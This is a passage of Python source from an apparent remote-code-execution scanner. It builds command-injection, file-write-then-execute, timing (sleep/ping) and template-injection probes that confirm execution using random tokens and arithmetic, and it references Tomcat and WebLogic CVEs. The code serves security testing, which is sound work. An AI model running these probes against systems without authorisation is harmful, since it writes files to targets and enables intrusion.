        675041)``, computes it, fails to resolve the method and echoes the
        result in its error, so the probe reported ``executed`` under
        ``[reflected/unix/...]`` with no shell anywhere in the picture. The
        remaining shapes all require the target to place RCEKit's random tags
        *around* the value it computed, which an expression evaluator handed
        this payload cannot do -- on that same endpoint, 0 of 36 tagged probes
        confirmed while 3 of 6 bare ones did."""
        probes: List[Probe] = []
        # Substitution-free and keyword-diverse. awk's concatenation binds looser
        # than '+', so `"T1" a+b "T2"` prints T1<sum>T2.
        core_awk = "awk 'BEGIN{print \"%s\" %d+%d \"%s\"}'" % (t1, a, b, t2)
        awk_literal = f"{a}+{b}"
        probes.extend(Probe(payload=payload, expected=f"{t1}{total}{t2}", forbidden=awk_literal)
                      for payload in self._wrap_variants(record, core_awk))
        # Comment-terminated: same proofs, but with whatever the application
        # appends after the injection point commented out.
        for terminated, expected, literal in (
                (core, f"{t1}{total}{t2}{t3}{t1}", f"$(({a}+{b}))"),
                (core_awk, f"{t1}{total}{t2}", awk_literal)):
            probes.extend(Probe(payload=payload, expected=expected, forbidden=literal)
                          for payload in self._wrap_variants(record, terminated, terminate=True))
        return probes

    def confirm(self, obs: "Observation", probe: "Probe") -> Verdict:
        return self._confirm_computed(obs, probe, boundary=probe.boundary)


class FileBased(DetectionMethod):
    """Self-OOB confirmation for internal / no-egress targets. The probe makes
    the target *write* a random token to a file it can also serve back, then a
    followup request fetches it: the token is present only if the command
    executed AND the write landed somewhere readable. No external listener is
    needed — the confirmation channel is the target's own read-back path.

    That path does not have to be a web root. An LFI endpoint, a download or
    export handler, an attachment fetcher and a ``/tmp``-backed preview are all
    read-back channels, and requiring a writable web root ruled every one of
    them out — on exactly the internal, no-egress targets this method exists
    for. ``--file-write-path`` and ``--file-read-url`` name the two halves
    directly; ``--webroot``/``--web-base-url`` remain as the convenience alias
    that builds them for the web-root case.

    This changes target state (one file per confirmed probe), so it stays gated
    on the operator naming both halves, and every finding carries an explicit
    cleanup command."""
    name = "file"
    tier = "executed"
    costly = True          # a second fetch reads the written token back
    # It writes a file to the target, and its own configuration is what gates
    # that: naming the directory and the read-back URL says more than the rung.
    safety = "stateful"
    gated_by_config = True

    def _channel(self) -> Optional[Tuple[str, str]]:
        """``(write_path, read_url_template)``, or ``None`` when not configured.

        ``--webroot``/``--web-base-url`` are resolved here rather than at the
        CLI so the alias and the general form cannot drift: a web root is just
        the case where the read URL is the base plus the filename."""
        write_path = self.config.get("file_write_path") or self.config.get("webroot")
        read_url = self.config.get("file_read_url")
        if not read_url and self.config.get("web_base_url"):
            read_url = self.config["web_base_url"].rstrip("/") + "/{name}"
        if not (write_path and read_url):
            return None
        return str(write_path), str(read_url)

    def applicable(self, record: "PayloadRecord") -> bool:
        if self._channel() is None:
            return False
        return record.environment in SHELL_CAPABLE_ENVIRONMENTS

    @staticmethod
    def _render_read_url(template: str, path: str, name: str) -> str:
        """Fill a read-back template.

        ``{name}`` suits a handler that takes a filename, ``{path}`` an LFI-style
        parameter that takes the whole server-side path, and ``{path_enc}`` the
        same percent-encoded for a handler that rejects raw separators. Only
        these three are substituted, so a URL containing other braces survives
        unchanged."""
        return (template
                .replace("{path_enc}", urllib.parse.quote(path, safe=""))
                .replace("{path}", path)
                .replace("{name}", name))

    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
        channel = self._channel()
        if channel is None:
            return []
        write_root, read_template = channel
        sink_env = self._sink_env(record)
        windows_paths = sink_env in WINDOWS_PATH_SINK_ENVS
        write_root = write_root.rstrip("\\") if windows_paths else write_root.rstrip("/")
        probes: List[Probe] = []
        # One filename and token per separator. Sharing them would make every
        # probe's followup succeed as soon as any one separator wrote the file,
        # so a confirmation could not say which break-out actually worked -- and
        # its cleanup command would name a file another probe wrote.
        for separator in self._separator_candidates(record, sink_env):
            name = "rcekit-" + "".join(rng.choice(string.ascii_lowercase + string.digits)
                                       for _ in range(12)) + ".txt"
            token = self._tag(rng) + "".join(rng.choice(string.ascii_uppercase + string.digits)
                                             for _ in range(10))
            if sink_env == "powershell":
                write_path = f"{write_root}\\{name}"
                # Set-Content, not `>`: in Windows PowerShell 5.1 the redirect
                # is Out-File, whose default encoding is UTF-16LE, and a
                # token written as UTF-16 is not the byte sequence the read-back
                # searches for -- the write would land and the probe would still
                # read as negative. Set-Content's default is a single-byte
                # encoding on 5.1 and UTF-8 on 7, both of which the read-back
                # finds.
                core = f"Set-Content -Path {write_path} -Value {token}"
                cleanup = f"Remove-Item -Force {write_path}"
            elif windows_paths:
                write_path = f"{write_root}\\{name}"
                core = f"echo {token}>{write_path}"
                cleanup = f"del {write_path}"
            else:
                write_path = f"{write_root}/{name}"
                core = f"echo {token} > {write_path}"
                cleanup = f"rm -f {write_path}"
            body = core if separator is None else f"{separator}{core}"
            followup = {"url": self._render_read_url(read_template, write_path, name),
                        "cleanup": cleanup, "path": write_path}
            # The write uses a `>` redirect, which ${IFS} would turn into an
            # ambiguous redirect, so this probe stays canonical under --evade low.
            probes.append(Probe(payload=self._wrap_context(record, body),
                                expected=token, forbidden=None, followup=followup))
        return probes

    def confirm(self, obs: "Observation", probe: "Probe") -> Verdict:
        if obs.status is None:
            return Verdict("error", f"write request never reached the target ({obs.body[:120]})")
        if obs.followup_body is None:
            return Verdict("negative",
                           "could not fetch the written file (no write, wrong write path or "
                           "read-back URL, or blocked)")
        if not self._search(probe.expected, obs.followup_body):
            return Verdict("negative", "token absent from the fetched file")
        # The token is random, so its presence anywhere in the payload-free
        # control — any channel, not just the body — means it did not get there
        # by being written and served.
        if self._search_channels(probe.expected,
                                 self._channels_of(obs.control_body, obs.control_channels)):
            return Verdict("inconclusive", "token also present without the payload")
        return Verdict("executed",
                       f"target wrote and served token {probe.expected!r} (execution + write primitive)")


class WriteThenExecute(DetectionMethod):
    """The inverse of :class:`FileBased`, for the class where nothing computes.

    ``file`` assumes execution exists and uses a write as proof of it. This
    method assumes a **write primitive** exists — the vulnerable request stores
    a file rather than evaluating anything — and uses *execution of the written
    file* as proof of RCE. A whole family of targets is invisible without it:
    ``tomcat/CVE-2017-12615`` (PUT a JSP), ``activemq/CVE-2016-3088``,
    ``weblogic/CVE-2018-2894``. Nothing in the vulnerable response is computed,
    so ``reflected`` and ``eval`` correctly report ``negative`` and the target is
    exploitable anyway.

    The probe is the file's *content*: a language one-liner that computes a
    product on random operands, delivered through the ordinary injection point.
    RCEKit then fetches the file back and reads the answer in three tiers, which
    is the whole value of the method:

    ==============================  ===============  ==================================
    fetched file contains           verdict          means
    ==============================  ===============  ==================================
    the product                     ``executed``     the file was written AND executed
    the one-liner, verbatim         ``file-write``   arbitrary file write, no execution
    neither                         ``negative``     no write, or it is not served here
    ==============================  ===============  ==================================

    Collapsing the middle row into either neighbour would be a lie in one
    direction or the other: an upload directory that is served but not
    interpreted is a real finding and not remote code execution.

    The filename is the operator's, not RCEKit's. Delivery substitutes one
    injection point, and every target in this class needs two locations (the
    name in the request line or a form field, the content in the body) — so
    RCEKit writes the content the operator's own request already names, and
    ``--write-url-template`` says where that lands. One artifact per run rather
    than one per probe is also the right trade for a state-changing method."""
    name = "write"
    tier = "executed"
    costly = True          # uploads, then fetches the file back
    # A write that is served but not interpreted is a real finding about a
    # different property, and it is this method that reports it.
    also_reports = ("file-write",)
    safety = "stateful"
    gated_by_config = True

    # One entry per file type whose interpreter is reachable by writing a file.
    # `exts` drives `--write-lang auto`; `template` takes {t1}/{t2} (boundary
    # tags) and {expr} (the arithmetic).
    #
    # No whitespace in any of them, and that is load-bearing rather than tidy.
    # The content is delivered through the operator's own injection point, and
    # some of those tokenise on spaces before anything is written: RRDtool --
    # reached through Cacti's `right_axis_label` -- builds the file from a
    # `LINE1:out:<content>` argument, so `RKAAA<?=7*6?>RKBBB` writes a 47-byte
    # file with the content intact while `RKAAA<?= 7*6 ?>RKBBB` writes nothing
    # at all and answers `ERROR: '7*6' is not a valid function name in 7*6`.
    # Whitespace inside `<?= ?>` and `<%= %>` is optional, so dropping it costs
    # nothing and buys every sink of that shape.
    #
    # JSP, ASPX and ERB share the `<%= %>` delimiters, so their probes are
    # byte-identical and the engine's per-payload de-duplication fires them as
    # one request. They stay separate names because `auto` narrows by extension,
    # and because a contributor adding a fourth `<%= %>` dialect should not have
    # to discover that by reading the payloads.
    LANGUAGES = {
        "jsp": {"exts": ("jsp",), "template": "{t1}<%={expr}%>{t2}"},
        "aspx": {"exts": ("aspx", "asp", "ashx"), "template": "{t1}<%={expr}%>{t2}"},
        "erb": {"exts": ("erb", "rhtml"), "template": "{t1}<%={expr}%>{t2}"},
        "php": {"exts": ("php", "php3", "php4", "php5", "php7", "phtml", "phar"),
                "template": "{t1}<?={expr}?>{t2}"},
        # .jspx is XML, so the scriptlet delimiters are not available at all --
        # the container parses the file as a document and `<%=` is character
        # data. It is the one shape here that is not a delimiter swap.
        "jspx": {"exts": ("jspx",),
                 "template": ('<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" '
                              'version="2.0"><jsp:expression>'
                              '"{t1}"+({expr})+"{t2}"</jsp:expression></jsp:root>')},
    }

    # Contexts whose wrapping makes sense for a file *body*. A break-out context
    # exists to escape a surrounding command or query; there is no surrounding
    # anything here -- the payload is the whole file -- so wrapping it in
    # `'; ... -- ` would write a broken file and prove nothing. The transport
    # contexts are the opposite case and are kept: a payload delivered in a JSON
    # or XML body has to survive that serialization to land intact.
    PLAIN_CONTEXT = "raw"

    # Operands for the product, and the bound is the interpreter's, not ours.
    # RCEKit computes `a*b` in Python, where integers do not overflow; the thing
    # on the other side usually does. JSP and ASPX are 3 of the 5 languages this
    # method writes and both evaluate it as a signed 32-bit int, so a product
    # past 2**31-1 comes back wrapped and the run reports `negative` against a
    # target that is fully exploitable.
    #
    # Measured against Tomcat 8.5.19 (CVE-2017-12615): `97233*38786` was served
    # as `-523688158` where RCEKit expected `3771279138`, while `4721*8093` came
    # back exactly. The earlier range drew a pair whose product overflows in 56%
    # of runs, and the operands are drawn once per run -- so more than half of
    # all runs against a JVM or .NET target lost, with no second probe to
    # recover.
    #
    # 4 digits apiece keeps the product under 10**8, comfortably inside the
    # bound, and is the range `eval` has always used against these same targets.
    # The product is not what makes this unforgeable on its own: it is bracketed
    # by two random tags and differenced against a payload-free control.
    OPERAND_LOW, OPERAND_HIGH = 1000, 9999

    def __init__(self, gen: "RCEKit", config: Optional[Dict[str, Any]] = None):
        super().__init__(gen, config)
        # Operands are drawn once per method instance rather than per carrier.
        # Every carrier then yields byte-identical content and the engine's
        # de-duplication collapses them to one write. Per-carrier operands would
        # be `random` in the same sense and would also write the file ~13 times
        # -- for a state-changing method that is not a cost, it is a blast
        # radius. Still fresh per run, which is what makes the product
        # unforgeable.
        #
        # Drawing once also means a single bad draw loses the whole run, which
        # is why the range below is chosen the way it is -- see OPERAND_RANGE.
        self._operands: Optional[Tuple[int, int, str, str]] = None

    def _channel(self) -> Optional[str]:
        """The URL the written file is served at, or ``None`` when unset."""
        template = self.config.get("write_read_url")
        return str(template) if template else None

    def applicable(self, record: "PayloadRecord") -> bool:
        if self._channel() is None:
            return False
        return (record.context == self.PLAIN_CONTEXT
                or record.context in self.gen.transport_contexts)

    def _selected_languages(self) -> List[str]:
        """Which file types to write, honouring ``--write-lang``.

        ``auto`` reads the extension off the read-back URL: the operator already
        said where the file is served, and that URL carries the one fact that
        decides which interpreter is on the other side. When it carries no
        extension RCEKit cannot know, so it writes all of them rather than
        guessing -- which costs three requests, not five, because three of the
        five templates are the same bytes."""
        wanted = self.config.get("write_langs")
        if wanted:
            return [name for name in self.LANGUAGES if name in wanted]
        url = self._channel() or ""
        # Only the path, so a `?file=x.jsp` query does not fool it into matching
        # a fragment or another parameter's value.
        path = urllib.parse.urlsplit(url).path
        _, _, extension = path.rpartition(".")
        extension = extension.strip("/").lower()
        if extension:
            inferred = [name for name, spec in self.LANGUAGES.items()
                        if extension in spec["exts"]]
            if inferred:
                return inferred
        return list(self.LANGUAGES)

    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
        read_url = self._channel()
        if read_url is None:
            return []
        if self._operands is None:
            self._operands = (rng.randint(self.OPERAND_LOW, self.OPERAND_HIGH),
                              rng.randint(self.OPERAND_LOW, self.OPERAND_HIGH),
                              self._tag(rng), self._tag(rng))
        a, b, t1, t2 = self._operands
        expr = f"{a}*{b}"
        product = a * b
        followup = {
            "url": read_url,
            # Not a shell command: RCEKit knows the URL the operator named, not
            # the server-side path, and printing a plausible-looking `rm -f`
            # built from a guess would be worse than saying what is true.
            "cleanup": f"remove the file the target serves at {read_url}",
        }
        # Languages that share a template share a probe. Naming them together
        # keeps the finding honest: those bytes are one request, and which
        # interpreter ran them is not something the response can distinguish --
        # reporting `jsp` for a confirmation an ASP.NET host produced would be a
        # guess dressed as evidence.
        by_body: "Dict[str, List[str]]" = {}
        for name in self._selected_languages():
            body = self.LANGUAGES[name]["template"].format(t1=t1, t2=t2, expr=expr)
            by_body.setdefault(body, []).append(name)
        probes: List[Probe] = []
        for body, names in by_body.items():
            probes.append(Probe(payload=self._wrap_context(record, body),
                                expected=f"{t1}{product}{t2}",
                                # The source form. Its presence in the fetched
                                # file is what separates "written but served as
                                # text" from "not written at all".
                                forbidden=body,
                                carrier="/".join(names), followup=followup))
        return probes

    def confirm(self, obs: "Observation", probe: "Probe") -> Verdict:
        if obs.status is None:
            return Verdict("error", f"write request never reached the target ({obs.body[:120]})")
        if obs.followup_body is None:
            return Verdict("error", "could not fetch the written file back "
                                    "(the read-back URL never answered)")
        if self._search(probe.expected, obs.followup_body):
            # Same differential as every other computed-value method: a product
            # on random operands that is already present without the payload is
            # not attributable to execution, wherever it turned up.
            if self._search_channels(probe.expected,
                                     self._channels_of(obs.control_body, obs.control_channels)):
                return Verdict("inconclusive",
                               "the computed value is also present without the payload")
            return Verdict("executed",
                           f"target wrote and then EXECUTED a {probe.carrier} file: it computed "
                           f"{probe.expected!r} from random operands the file itself carried")
        if probe.forbidden and self._search(probe.forbidden, obs.followup_body):
            # Deliberately not merged into either neighbour. The write landed
            # and is served, which is a real finding; the interpreter did not
            # run it, which means this is not remote code execution.
            #
            # `file-write` and not `needs-review`: the file is on the target
            # and RCEKit read it back, so nothing here is under review. This
            # evidence string used to open with the word "confirmed" while the
            # status said the opposite -- which is what a tier naming the
            # tool's confidence rather than the target's behaviour costs.
            #
            # No `-sink` suffix, unlike the neighbouring tiers: a sink in this
            # vocabulary *evaluated* what it was handed. This target stored it.
            return Verdict("file-write",
                           "ARBITRARY FILE WRITE -- the written file is served back "
                           f"verbatim ({probe.carrier} source, not executed), so the upload "
                           "directory is reachable but not interpreted")
        return Verdict("negative",
                       "neither the computed value nor the written source came back from the "
                       "read-back URL (no write, or the file is not served there)")


class ParametricTime(DetectionMethod):
    """Hardened blind timing. Instead of a single margin over one slow response,
    fire a controlled series of delays (``d ∈ {0, N, 2N}``, each repeated) and
    require the response time to track the injected delay — a slope of about one
    second of latency per injected second. Jitter cannot fake that.

    Two confounds the naive version of this gets wrong, both handled here:

    * **Which separator breaks out.** A regression blends every probe into one
      measurement, so it cannot sweep separators the way the results-based
      methods do — mixing a working break-out with broken ones destroys the
      signal. Firing a full regression through *every* candidate separator costs
      a sleep per probe per separator, which is why this screens first: one cheap
      probe per separator, then the regression through whichever one actually
      delayed.
    * **Latency drift.** Probes fired in ascending delay order make the injected
      delay collinear with the request index, so a target that simply gets slower
      during the run — progressive load, a rate limiter backing off, a filling
      log — produces a textbook-perfect linear fit while being entirely
      un-injectable. The order is randomised *and* the request index enters the
      model as a nuisance term, so drift loads onto the drift coefficient rather
      than masquerading as a sleep.

    Timing has no value the target *computed*, so by design this never reaches
    ``executed`` on its own. What it does reach is proven, and has its own
    name: ``timing-sink`` says the target honoured a delay RCEKit injected. A
    clean regression is not a hedge — a slope near one second per injected
    second, through a randomised order, with the request index modelled out and
    the delay term standing clear of the residual by a factor of three, is not
    something jitter or drift produces. This reported ``needs-review`` for two
    releases, which said the tool was unsure of something it had measured.

    What holds it at its own tier rather than joining the execution channels is
    narrower than uncertainty: a delay honoured is not necessarily a *shell*
    honouring it. A sandbox that implements ``sleep`` itself, or anything in the
    path that waits, answers the regression the same way. So pair it with
    ``--methods reflected`` for an execution proof; a linear timing response
    then corroborates the results-based one."""
    name = "time"
    tier = "timing-sink"
    costly = True          # every probe is a real sleep
    aggregate = True
    # Per-carrier state, set by build_probes before next_probes/confirm_series
    # ever run. Declared here so a partially-driven instance is still coherent.
    _record: Optional["PayloadRecord"] = None
    _rng: Optional["random.Random"] = None
    _separator: Optional[str] = None
    _pending_separators: Tuple[Optional[str], ...] = ()
    # Separators screened before the rest: ';' and '|' break out of the large
    # majority of sinks, so most carriers never pay for the other three.
    SCREEN_FIRST_WAVE = 2

    def applicable(self, record: "PayloadRecord") -> bool:
        return record.environment in SHELL_CAPABLE_ENVIRONMENTS

    def _sleep_core(self, delay: float, sink_env: str = "unix") -> str:
        if sink_env == "windows":
            # `ping -n k` waits ~(k-1)s; +1 so d=0 is a single instant ping.
            return f"ping 127.0.0.1 -n {int(round(delay)) + 1} >nul"
        if sink_env == "powershell":
            # Milliseconds rather than -Seconds: the regression fires at 0, base
            # and 2*base, and a fractional --time-base would be truncated to an
            # integer second, collapsing two of the three levels onto each other
            # and leaving nothing for the slope to be measured from.
            return f"Start-Sleep -Milliseconds {int(round(delay * 1000))}"
        return f"sleep {delay:g}"

    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
        """Round one: screen the separators. One probe at delay 0 and one at the
        base delay per candidate separator, so the expensive regression is only
        ever run through a break-out that demonstrably reached a shell."""
        self._record = record
        self._rng = rng
        base = float(self.config.get("time_base", 2.0))
        sink_env = self._sink_env(record)
        # Every candidate separator is screened at both probe depths. Narrowing
        # this to the first one is the cheapest-looking saving here and the most
        # expensive: it puts back the ';'-only blind spot the screen exists to
        # remove, so a sink that merely filters ';' reports negative -- silently,
        # and only for the operator who chose 'quick' to be gentle on a
        # rate-limited target. --probe-depth trades probe *shapes* for requests;
        # it does not trade away a break-out this method cannot detect without.
        separators = self._separator_candidates(record, sink_env)
        # Screen in two waves. Each delayed screen probe costs a real sleep, so
        # screening all five separators up front spent `5 x base` seconds on
        # every carrier -- including the carriers that can never break out at
        # all. The first wave is the two separators that work on the large
        # majority of sinks; the rest are only screened if neither delayed.
        self._pending_separators = tuple(separators[self.SCREEN_FIRST_WAVE:])
        return self._screen_probes(record, separators[:self.SCREEN_FIRST_WAVE], base, sink_env, rng)

    def _screen_probes(self, record: "PayloadRecord", separators, base: float,
                       sink_env: str, rng: "random.Random") -> List[Probe]:
        """A paired 0s/base probe per separator. The pair is what keeps a
        uniformly slow endpoint from reading as a break-out."""
        probes = [Probe(payload=self._payload(record, 0.0, sep, sink_env), expected="",
                        delay_s=0.0, separator=sep, phase="screen")
                  for sep in separators]
        probes += [Probe(payload=self._payload(record, base, sep, sink_env), expected="",
                         delay_s=base, separator=sep, phase="screen")
                   for sep in separators]
        # A bridge is screened as its own "separator". COPY FROM PROGRAM and
        # xp_cmdshell both block until the program exits, so the delay lands in
        # the response exactly as a shell sleep does -- and unlike the
        # arithmetic oracle this needs nothing rendered, which is what makes it
        # the reliable way to prove a query-language bridge.
        for name, _ in self._selected_bridges(sink_env):
            for delay in (0.0, base):
                payload = self._bridge_payload(record, delay, name, sink_env)
                if payload is None:
                    continue
                probes.append(Probe(payload=payload, expected="", delay_s=delay,
                                    separator=self.BRIDGE_PREFIX + name, phase="screen"))
        rng.shuffle(probes)
        return probes

    # A separator label that names a bridge rather than a shell chainer. The
    # regression has to rebuild the exact shape the screen found, and a bridge
    # payload is built by a different path from a separator-led one, so the
    # label carries which path to take instead of the two being told apart by
    # guesswork.
    BRIDGE_PREFIX = "bridge:"

    def _bridge_payload(self, record: "PayloadRecord", delay: float, name: str,
                        sink_env: str) -> Optional[str]:
        """The sleep core carried through one named bridge, or ``None``.

        The table name a stateful bridge generates is derived from the run's rng
        rather than drawn fresh here, so the screen and the regression address
        the same object instead of littering one table per probe."""
        seeded = random.Random(f"{name}:{record.environment}:{record.context}")
        for built_name, payload, _cleanup in self._bridge_variants(
                record, self._sleep_core(delay, sink_env), sink_env, seeded):
            if built_name == name:
                return payload
        return None

    def _payload(self, record: "PayloadRecord", delay: float, separator: Optional[str],
                 sink_env: str = "unix") -> str:
        if separator and separator.startswith(self.BRIDGE_PREFIX):
            built = self._bridge_payload(
                record, delay, separator[len(self.BRIDGE_PREFIX):], sink_env)
            if built is not None:
                return built
        body = self._sleep_core(delay, sink_env)
        if separator is not None:
            body = f"{separator}{body}"
        # Canonical, like every other probe: a rung is applied on retry, to
        # the shapes a filter refused.
        return self._wrap_context(record, body)

    def next_probes(self, series: "List[Tuple[Probe, Observation]]") -> List[Probe]:
        """Round two: the full regression, through the separator that delayed
        most in the screen. Returns ``[]`` when no separator delayed (nothing to
        measure) or once the regression has already been fired."""
        if any(probe.phase == "regress" for probe, _ in series):
            return []
        base = float(self.config.get("time_base", 2.0))
        repeats = max(1, int(self.config.get("time_repeats", 3)))
        sink_env = self._sink_env(self._record)
        quick = {}
        slow = {}
        for probe, obs in series:
            if obs.status is None:
                continue
            (quick if (probe.delay_s or 0.0) == 0.0 else slow)[probe.separator] = obs.elapsed
        # A separator worked if its delayed probe cleared its own zero-delay
        # probe by most of the injected delay. Requiring the *pair* keeps a
        # uniformly slow endpoint from looking like a break-out.
        gains = {sep: slow[sep] - quick.get(sep, 0.0) for sep in slow if sep in quick}
        candidates = [sep for sep, gain in gains.items() if gain >= 0.6 * base]
        if not candidates:
            # Nothing in the first wave broke out. Screen the separators held
            # back rather than concluding anything from a partial sweep -- a
            # sink that filters ';' and '|' is exactly the case the sweep is for.
            pending, self._pending_separators = self._pending_separators, ()
            if pending:
                return self._screen_probes(self._record, pending, base, sink_env, self._rng)
            return []
        best = max(candidates, key=lambda sep: gains[sep])
        self._separator = best
        probes: List[Probe] = []
        for multiplier in (0, 1, 2):
            delay = base * multiplier
            for _ in range(repeats):
                probes.append(Probe(payload=self._payload(self._record, delay, best, sink_env),
                                    expected="", delay_s=delay, separator=best, phase="regress"))
        # Randomise the fire order so the injected delay is decorrelated from the
        # request index, which is what makes the drift term below identifiable.
        self._rng.shuffle(probes)
        return probes

    def confirm_series(self, series: "List[Tuple[Probe, Observation]]") -> Verdict:
        regression = [(p, o) for p, o in series if p.phase == "regress"]
        if not regression:
            screened = ", ".join(
                f"{(p.separator or 'bare').strip() or 'newline'}={o.elapsed:.2f}s"
                for p, o in series if (p.delay_s or 0.0) > 0)
            if any(o.status is None for _, o in series):
                return Verdict("error", "one or more timing probes never reached the target "
                                        "(delivery/TLS failure); regression not judged")
            return Verdict("negative",
                           f"no command separator produced a delay, so no regression was run "
                           f"({screened or 'no samples'})")
        if any(obs.status is None for _, obs in regression):
            return Verdict("error", "one or more timing probes never reached the target "
                                    "(delivery/TLS failure); regression not judged")

        delays = [p.delay_s or 0.0 for p, _ in regression]
        elapsed = [o.elapsed for _, o in regression]
        index = [float(i) for i in range(len(regression))]
        n = len(regression)
        if n < 4 or len(set(delays)) < 2:
            return Verdict("negative", "insufficient timing samples for a regression")

        # Least squares for elapsed ~ intercept + b_delay*delay + b_drift*index.
        # Two predictors and a constant, solved in closed form -- no third-party
        # dependency, and cheap enough to be irrelevant next to the sleeps.
        mean_d = sum(delays) / n
        mean_i = sum(index) / n
        mean_e = sum(elapsed) / n
        cd = [x - mean_d for x in delays]
        ci = [x - mean_i for x in index]
        ce = [x - mean_e for x in elapsed]
        s_dd = sum(x * x for x in cd)
        s_ii = sum(x * x for x in ci)
        s_di = sum(x * y for x, y in zip(cd, ci))
        s_de = sum(x * y for x, y in zip(cd, ce))
        s_ie = sum(x * y for x, y in zip(ci, ce))
        det = s_dd * s_ii - s_di * s_di
        if det <= 0:
            return Verdict("negative",
                           "timing design degenerate (delay and request order collinear)")
        b_delay = (s_de * s_ii - s_ie * s_di) / det
        b_drift = (s_ie * s_dd - s_de * s_di) / det
        intercept = mean_e - b_delay * mean_d - b_drift * mean_i
        residuals = [e - (intercept + b_delay * d + b_drift * i)
                     for e, d, i in zip(elapsed, delays, index)]
        sigma = (sum(r * r for r in residuals) / max(1, n - 3)) ** 0.5
        stderr_delay = sigma * (s_ii / det) ** 0.5

        sep = (self._separator or "bare").strip() or "newline"
        observed = ", ".join(f"d={d:g}s→{e:.2f}s" for d, e in sorted(zip(delays, elapsed)))
        summary = (f"{observed} | slope {b_delay:.2f}s per injected second, "
                   f"drift {b_drift:+.2f}s per request, separator {sep!r}")
        # A real sleep moves the response one second per injected second.
        if not 0.6 <= b_delay <= 1.4:
            return Verdict("negative", f"response time does not track the delay ({summary})")
        # ...and the delay term has to stand clear of the residual noise, or the
        # slope is an artefact of a handful of jittery samples.
        if stderr_delay > 0 and b_delay < 3 * stderr_delay:
            return Verdict("negative", f"delay term not separable from noise ({summary})")
        return Verdict("timing-sink",
                       f"the target honoured a delay RCEKit injected: response time tracks the "
                       f"controlled series with the request index modelled out ({summary}). What "
                       "waited is not shown — a sandbox that implements sleep answers this the "
                       "same way — so pair with --methods reflected for an execution proof")


class EvalExpr(DetectionMethod):
    """Code / expression injection (SSTI, SpEL, OGNL, Groovy, raw eval). Inject
    ``a*b`` on random operands wrapped in each common template/expression
    syntax, and confirm the *product* appears in the response while the literal
    ``a*b`` does not — the same computed-value invariant as ReflectedMath, but
    for an expression evaluator rather than a shell.

    A template that renders the payload verbatim echoes ``a*b``, never the
    product, so reflection cannot fake it. Probe payloads depend only on the
    injection context (not the environment), so the engine's per-payload
    de-duplication fires each syntax once per context."""
    name = "eval"
    tier = "executed"

    # Delimiters for the common expression/template evaluators, plus a bare form
    # for raw eval() sinks. {expr} is substituted with the random arithmetic.
    _FORMS = (
        "{expr}",            # raw eval (Python/JS/Ruby eval, etc.)
        "${{{expr}}}",       # Freemarker / JSP EL / SpEL  -> ${a*b}
        "{{{{{expr}}}}}",    # Jinja2 / Twig / Nunjucks     -> {{a*b}}
        "#{{{expr}}}",       # SpEL / Thymeleaf             -> #{a*b}
        "%{{{expr}}}",       # OGNL / Struts                -> %{a*b}
        "<%= {expr} %>",     # ERB / JSP scriptlet
        "@({expr})",         # Razor
    )

    # The token a corpus carrier substitutes the arithmetic into. Deliberately
    # not a brace placeholder: every carrier template is itself full of braces,
    # and escaping them for str.format is a bug waiting to happen in a file
    # contributors are meant to edit by hand.
    CARRIER_TOKEN = "__EXPR__"
    # And the operands apart, for an engine whose arithmetic is a filter or a
    # tag rather than an expression. Liquid multiplies with
    # ``{{ a | times: b }}`` and Django with ``{% widthratio a 1 b %}``;
    # neither can be written with the joined expression at all, so without
    # these two an engine that evaluates the template is reported negative.
    CARRIER_OPERAND_TOKENS = ("__A__", "__B__")

    def applicable(self, record: "PayloadRecord") -> bool:
        return True

    def _carrier_tokens(self) -> Tuple[str, ...]:
        return (self.CARRIER_TOKEN,) + tuple(self.CARRIER_OPERAND_TOKENS)

    def _render_carrier(self, template: str, a: int, b: int) -> str:
        """Substitute a carrier's tokens: the joined arithmetic, and the two
        operands for an engine that multiplies them itself."""
        left, right = self.CARRIER_OPERAND_TOKENS
        return (template.replace(self.CARRIER_TOKEN, f"{a}*{b}")
                .replace(left, str(a)).replace(right, str(b)))

    def _selected_carriers(self) -> List[Tuple[str, Dict[str, Any]]]:
        """The corpus carriers to try, honouring ``--eval-engines``.

        An unknown name is not silently dropped: narrowing a run to nothing
        because of a typo would report a clean negative from a run that tested
        almost nothing."""
        carriers = getattr(self.gen, "eval_carriers", None) or {}
        wanted = self.config.get("eval_engines")
        selected = []
        for name, carrier in carriers.items():
            if not isinstance(carrier, dict) or not carrier.get("template"):
                continue
            # A template that is not parameterised by *both* operands can
            # never confirm. With no token at all it renders the same constant
            # every probe; with only one operand the target is never handed the
            # other, so nothing it can compute is the product RCEKit is looking
            # for. Either way the request is spent to learn nothing, and an
            # unconfirmable probe still counts toward the coverage the run
            # reports -- which is the failure worth avoiding, not the request.
            template = str(carrier["template"])
            left, right = self.CARRIER_OPERAND_TOKENS
            if not (self.CARRIER_TOKEN in template
                    or (left in template and right in template)):
                continue
            if wanted:
                engines = set(carrier.get("engines") or []) | {name}
                if not engines & set(wanted):
                    continue
            selected.append((name, carrier))
        return selected

    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
        a = rng.randint(1000, 9999)
        b = rng.randint(1000, 9999)
        expr = f"{a}*{b}"
        expected = str(a * b)
        probes: List[Probe] = []
        # Bare forms first: fewest requests, cleanest evidence line, and they
        # already cover every engine measured to evaluate a plain expression --
        # OGNL (even with member access denied outright), SpEL (including its
        # restricted context), Groovy, Jinja2 (including SandboxedEnvironment),
        # ERB, and raw eval sinks. A member-access sandbox restricts method and
        # field access; arithmetic needs neither, so it is not what a carrier is
        # for here.
        for form in self._FORMS:
            probes.append(Probe(payload=self._wrap_context(record, form.format(expr=expr)),
                                expected=expected, forbidden=expr))
        # Then the carriers, for the engines that do NOT return a bare product
        # from a bare expression. Each is a measured false negative, not a
        # precaution -- see the `verified` note on each corpus entry.
        for name, carrier in self._selected_carriers():
            body = self._render_carrier(str(carrier["template"]), a, b)
            # `forbidden` stays the pre-execution arithmetic, which is what it
            # means everywhere else. A filter or tag carrier does not spell
            # `a*b` out, so the "target also reflects the payload verbatim"
            # note simply does not fire for one -- it is a note on the evidence
            # line and never a verdict. Setting it to the rendered body instead
            # would make it equal the payload, and `forbidden in payload` would
            # hold for every carrier no matter what the carrier did.
            probes.append(Probe(payload=self._wrap_context(record, body),
                                expected=expected, forbidden=expr, carrier=name))
        return probes

    def confirm(self, obs: "Observation", probe: "Probe") -> Verdict:
